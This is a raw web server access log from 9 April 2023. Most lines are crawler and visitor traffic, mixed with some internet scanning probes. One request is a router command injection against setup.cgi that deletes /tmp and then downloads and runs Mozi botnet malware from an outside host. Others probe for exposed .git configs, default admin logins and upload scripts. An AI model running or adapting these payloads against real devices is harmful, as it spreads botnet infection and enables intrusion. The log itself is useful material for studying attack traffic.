62.171.175.68 - - [09/Apr/2023:16:28:42 +0000] "CONNECT 84.153.75.193:4444 HTTP/1.1" 400 157 "-" "-"
172.105.128.13 - - [09/Apr/2023:16:40:41 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.88.61.141 - - [09/Apr/2023:16:41:42 +0000] "GET / HTTP/1.1" 200 141627 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
193.32.162.159 - - [09/Apr/2023:17:14:04 +0000] "GET / HTTP/1.1" 200 415717 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [09/Apr/2023:17:14:14 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
52.167.144.57 - - [09/Apr/2023:17:16:11 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
207.46.13.223 - - [09/Apr/2023:17:16:22 +0000] "GET / HTTP/1.1" 200 865 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [09/Apr/2023:17:26:54 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.109 - - [09/Apr/2023:17:58:37 +0000] "GET /.git/config HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
92.118.39.109 - - [09/Apr/2023:17:58:37 +0000] "GET /.git/config HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
130.255.166.122 - - [09/Apr/2023:18:24:51 +0000] "GET /robots.txt HTTP/1.1" 200 25 "-" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
130.255.166.121 - - [09/Apr/2023:18:24:51 +0000] "GET /humans.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
130.255.166.69 - - [09/Apr/2023:18:24:51 +0000] "GET /ads.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
130.255.166.69 - - [09/Apr/2023:18:24:52 +0000] "GET / HTTP/1.1" 200 415749 "-" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36"
143.110.222.166 - - [09/Apr/2023:18:26:08 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [09/Apr/2023:18:34:28 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Hello World"
223.247.179.42 - - [09/Apr/2023:18:36:08 +0000] "GET / HTTP/1.1" 200 338555 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
140.246.164.95 - - [09/Apr/2023:18:36:10 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
207.46.13.223 - - [09/Apr/2023:19:03:42 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [09/Apr/2023:19:27:30 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
62.171.175.68 - - [09/Apr/2023:19:35:54 +0000] "CONNECT 84.153.75.193:4444 HTTP/1.1" 400 157 "-" "-"
62.171.175.68 - - [09/Apr/2023:19:39:57 +0000] "CONNECT 84.153.75.193:4444 HTTP/1.1" 400 157 "-" "-"
52.167.144.56 - - [09/Apr/2023:19:41:57 +0000] "GET /robots.txt HTTP/1.1" 200 95 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.92 - - [09/Apr/2023:19:42:05 +0000] "GET / HTTP/1.1" 200 3489 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
167.94.138.35 - - [09/Apr/2023:19:49:50 +0000] "GET / HTTP/1.1" 200 130081 "-" "-"
167.94.138.35 - - [09/Apr/2023:19:49:51 +0000] "GET / HTTP/1.1" 200 368958 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.35 - - [09/Apr/2023:19:49:51 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.138.35 - - [09/Apr/2023:19:49:51 +0000] "GET /favicon.png HTTP/1.1" 200 17440 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.35 - - [09/Apr/2023:19:49:52 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 15195 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.35 - - [09/Apr/2023:19:49:52 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
157.55.39.225 - - [09/Apr/2023:20:13:55 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.225 - - [09/Apr/2023:20:13:55 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [09/Apr/2023:20:25:06 +0000] "GET / HTTP/1.1" 200 415749 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.94.146.58 - - [09/Apr/2023:20:26:19 +0000] "GET / HTTP/1.1" 200 5190 "-" "-"
167.94.146.58 - - [09/Apr/2023:20:26:19 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.58 - - [09/Apr/2023:20:26:19 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.146.58 - - [09/Apr/2023:20:26:19 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
36.26.134.235 - - [09/Apr/2023:20:34:17 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://36.26.134.235:60884/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 0 "-" "-"
87.236.176.153 - - [09/Apr/2023:20:37:31 +0000] "GET / HTTP/1.1" 200 415812 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.150 - - [09/Apr/2023:20:37:32 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 15195 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.63 - - [09/Apr/2023:20:37:32 +0000] "GET /favicon.png HTTP/1.1" 200 17440 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:20:45:54 +0000] "GET /searx/search?q=coming%20down%20meaning HTTP/1.1" 200 6694 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:20:45:54 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:20:45:54 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 200 17731 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:20:45:55 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 200 1457 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:20:45:55 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 200 45062 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:20:45:55 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 200 6370 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:20:45:55 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 200 89501 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:20:45:55 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 200 39680 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:20:45:55 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
107.170.241.36 - - [09/Apr/2023:20:50:31 +0000] "GET /actuator/health HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
193.32.162.159 - - [09/Apr/2023:21:08:31 +0000] "GET / HTTP/1.1" 200 415717 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [09/Apr/2023:21:08:41 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
51.222.253.11 - - [09/Apr/2023:21:21:02 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.57 - - [09/Apr/2023:21:21:03 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
143.110.222.166 - - [09/Apr/2023:21:25:53 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
134.122.39.186 - - [09/Apr/2023:21:40:58 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x10N\xA5y'\x8B\x88\xA0~\xB1\xCCl\xA6\x9A\x9AP6m/Du\xD8D_2\xE8Yu%Q\x11\x1A\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
134.122.39.186 - - [09/Apr/2023:21:40:58 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1C\x04\xBB\xA3&\xA6\xDC\x192\xEFD\xEA\x8B\xF3@O\xF6\xFC'\x84rn<\x15\x16\xDC\xF7y\xF0\xEF\xE5\x1C\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
134.122.39.186 - - [09/Apr/2023:21:40:58 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.122.39.186 - - [09/Apr/2023:21:40:58 +0000] "GET /client/get_targets HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.122.39.186 - - [09/Apr/2023:21:40:59 +0000] "GET /upl.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
134.122.39.186 - - [09/Apr/2023:21:40:59 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x935\x1E\x9B\xF9)J%\x90\xAB\xC0\xCFK" 400 157 "-" "-"
134.122.39.186 - - [09/Apr/2023:21:40:59 +0000] "GET /geoip/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.122.39.186 - - [09/Apr/2023:21:41:00 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
134.122.39.186 - - [09/Apr/2023:21:41:00 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
52.167.144.59 - - [09/Apr/2023:21:50:43 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.92 - - [09/Apr/2023:21:50:47 +0000] "GET / HTTP/1.1" 200 796 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
198.199.94.56 - - [09/Apr/2023:21:57:08 +0000] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
162.243.141.12 - - [09/Apr/2023:21:57:46 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 zgrab/0.x"
54.36.148.180 - - [09/Apr/2023:22:08:43 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.149.99 - - [09/Apr/2023:22:08:45 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
40.77.167.108 - - [09/Apr/2023:22:20:01 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.211 - - [09/Apr/2023:22:20:24 +0000] "GET / HTTP/1.1" 200 1707 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.59 - - [09/Apr/2023:22:21:13 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.59 - - [09/Apr/2023:22:21:13 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.95 - - [09/Apr/2023:22:21:22 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
152.89.196.54 - - [09/Apr/2023:22:23:27 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 415812 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2602:80d:1000:b0cc:e:2:5:7 - - [09/Apr/2023:22:35:31 +0000] "GET / HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2602:80d:1000:b0cc:e:2:5:7 - - [09/Apr/2023:22:35:32 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
107.170.252.8 - - [09/Apr/2023:22:48:05 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
52.167.144.95 - - [09/Apr/2023:22:50:23 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
51.158.37.190 - - [09/Apr/2023:23:17:59 +0000] "GET / HTTP/1.1" 200 5190 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
51.158.37.190 - - [09/Apr/2023:23:17:59 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
192.35.222.19 - - [09/Apr/2023:23:24:34 +0000] "PROXY TCP4 192.35.222.19 202.94.73.42 54974 80" 400 157 "-" "-"
117.243.131.175 - - [09/Apr/2023:23:26:12 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 0 "-" "-"
143.110.222.166 - - [09/Apr/2023:23:30:48 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
113.125.51.198 - - [09/Apr/2023:23:34:37 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
107.170.249.16 - - [09/Apr/2023:23:36:40 +0000] "GET /version HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
140.246.136.252 - - [09/Apr/2023:23:36:51 +0000] "GET / HTTP/1.1" 200 319731 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.225.74.227 - - [09/Apr/2023:23:42:28 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 0 "http://208.76.222.31:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.225.74.227 - - [09/Apr/2023:23:42:28 +0000] "" 400 0 "-" "-"
167.71.102.95 - - [09/Apr/2023:23:48:21 +0000] "\x00\x0E8)^\xC3~'\x22\xF4\x03\x00\x00\x00\x00\x00" 400 157 "-" "-"
52.167.144.59 - - [09/Apr/2023:23:49:42 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.95 - - [09/Apr/2023:23:49:48 +0000] "GET / HTTP/1.1" 200 1010 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
64.227.99.233 - - [09/Apr/2023:23:51:47 +0000] "\x00\x0E8\x1E\x1BW\xD3\x00bB\x06\x00\x00\x00\x00\x00" 400 157 "-" "-"
52.167.144.55 - - [09/Apr/2023:23:54:05 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
207.46.13.218 - - [09/Apr/2023:23:56:36 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
207.46.13.214 - - [09/Apr/2023:23:56:45 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
